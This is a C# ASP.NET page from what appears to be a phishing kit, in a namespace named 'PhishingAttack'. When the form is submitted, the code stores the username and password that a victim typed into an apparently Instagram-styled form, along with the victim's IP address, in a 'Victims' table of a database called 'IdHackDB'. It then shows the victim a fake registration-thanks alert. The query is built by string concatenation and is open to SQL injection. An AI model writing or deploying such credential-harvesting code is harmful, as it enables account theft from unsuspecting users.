using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Data;
using System.Data.SqlClient;

namespace PhishingAttack.Admin
{
    public partial class GenerateLinkInsta : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            if (IsPostBack)
            {
               
            }
        }

        protected void btnSubmit_Click(object sender, EventArgs e)
        {
            if (Session["AttackerUsername"] != null)
            {
                string AttackerUsername = Session["AttackerUsername"].ToString();
                string Category = Session["Category"].ToString();

                string ipadd = string.Empty;
                if (HttpContext.Current.Request.ServerVariables["HTTP_X_FORWARDER_FOR"] != null)
                {
                    ipadd = HttpContext.Current.Request.ServerVariables["HTTP_X_FORWARDER_FOR"].ToString();
                }
                else if (HttpContext.Current.Request.UserHostAddress.Length != 0)
                {
                    ipadd = HttpContext.Current.Request.UserHostAddress;
                }
                string ipaddresses = "your ip address is :" + ipadd;

                string todaydate = DateTime.Now.ToShortDateString();

                string mycon = "Data Source=TOSHIBA-PC\\SQLEXPRESS;Initial Catalog=IdHackDB;Integrated Security=True";
                string query = "insert into Victims(Username,Category,VictimUserName,Password,IPAddress,Date) values ('"+AttackerUsername+"','"+Category+"','"+txtUserName.Text+"','"+txtPassword.Text+"','"+ipaddresses+"','"+todaydate+"')";
                
                SqlConnection con = new SqlConnection(mycon);
                con.Open();
                SqlCommand cmd = new SqlCommand();
                cmd.CommandText = query;
                cmd.Connection = con;
                cmd.ExecuteNonQuery();
                con.Close();
                txtUserName.Text = "";
                txtPassword.Text = "";

                Response.Write("<script LANGUAGE='JavaScript' >alert('thanks for registration we will notify you soon!!')</script>");
            }

                       
        }


       

    }
}